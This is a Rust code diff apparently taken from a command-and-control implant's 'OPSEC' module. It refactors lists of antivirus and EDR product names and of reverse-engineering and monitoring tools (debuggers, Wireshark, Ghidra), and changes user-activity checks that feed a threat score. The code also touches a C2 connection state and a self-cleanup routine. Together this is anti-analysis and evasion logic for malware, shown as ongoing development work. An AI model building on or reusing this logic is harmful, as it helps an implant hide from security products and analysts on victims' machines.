@@ -1,29 +1,14 @@
 use chrono::Datelike;
-use log::{debug, warn, info};
+use log::{debug, warn, info, error};
 use std::sync::Mutex;
 use chrono::Timelike;
 use once_cell::sync::Lazy;
 use serde::{Serialize, Deserialize};
 use bincode::{Encode, Decode};
 use crate::state::MEMORY_PROTECTOR;
-use crate::high_threat_tools::{HIGH_THREAT_ANALYSIS_TOOLS};
+use crate::high_threat_tools::{HIGH_THREAT_ANALYSIS_TOOLS, COMMON_AV_EDR_PROCESSES, SUSPICIOUS_WINDOW_TITLES};
+use crate::util::now_timestamp;
 use zeroize::Zeroize;
-
-// Add missing constants that are referenced in code
-const COMMON_AV_EDR_PROCESSES: &[&str] = &[
-    "mcafee", "symantec", "norton", "kaspersky", "bitdefender", "avast", "avg",
-    "windows defender", "defender", "crowdstrike", "sentinelone", "carbonblack",
-    "cylance", "sophos", "trendmicro", "eset", "malwarebytes", "webroot",
-    "endgame", "fireeye", "paloalto", "cybereason", "tanium"
-];
-
-const SUSPICIOUS_WINDOW_TITLES: &[&str] = &[
-    "ida", "ollydbg", "x64dbg", "x32dbg", "immunity", "windbg", "ghidra",
-    "wireshark", "fiddler", "burp suite", "process monitor", "process explorer",
-    "regshot", "autoruns", "sysinternals", "volatility", "hex editor",
-    "cheat engine", "dnspy", "reflector", "dotpeek", "resource hacker",
-    "pe explorer", "cff explorer", "pestudio", "exeinfo", "detect it easy"
-];
 
 // --- OPSEC Scoring Constants ---
 const SCORE_DECAY_FACTOR: f32 = 0.85; // Changed from 0.95 for faster testing
@@ -134,14 +119,6 @@ impl Default for OpsecContext {
             c2_connection_unstable: false,
         }
     }
-}
-
-//  Helper function to get current timestamp
-fn now_timestamp() -> u64 {
-    std::time::SystemTime::now()
-        .duration_since(std::time::UNIX_EPOCH)
-        .unwrap_or_default()
-        .as_secs()
 }
 
 //  Helper function to check if timestamp is within duration
@@ -394,6 +371,7 @@ fn update_opsec_score_and_mode(
     opsec_state.mode
 }
 
+#[allow(dead_code)] // Intended for future high-threat auto-response
 pub fn perform_self_cleanup() -> ! {
     warn!("[OPSEC] Performing self-cleanup due to high threat detection");
     std::process::exit(0);
@@ -441,26 +419,15 @@ fn check_idle_level() -> OpsecLevel {
 
 #[cfg(not(target_os = "windows"))]
 fn check_idle_level() -> OpsecLevel {
-    // For non-Windows, use a simple process-based heuristic
-    use std::process::Command;
-    
-    // Check if there are active user processes (simplified)
-    match Command::new("who").output() {
-        Ok(output) => {
-            let output_str = String::from_utf8_lossy(&output.stdout);
-            if output_str.trim().is_empty() {
-                debug!("[OPSEC] No active users detected (Linux)");
-                OpsecLevel::Low
-            } else {
-                debug!("[OPSEC] Active users detected (Linux)");
-                OpsecLevel::High
-            }
-        }
-        Err(_) => {
-            // Fallback: assume user is active for safety
-            debug!("[OPSEC] Could not check user activity, assuming active");
-            OpsecLevel::High
-        }
+    use sysinfo::Users;
+
+    let users = Users::new_with_refreshed_list();
+    if users.list().is_empty() {
+        debug!("[OPSEC] No active users detected (Linux/sysinfo)");
+        OpsecLevel::Low
+    } else {
+        debug!("[OPSEC] {} active user(s) detected (Linux/sysinfo)", users.list().len());
+        OpsecLevel::High
     }
 }
 
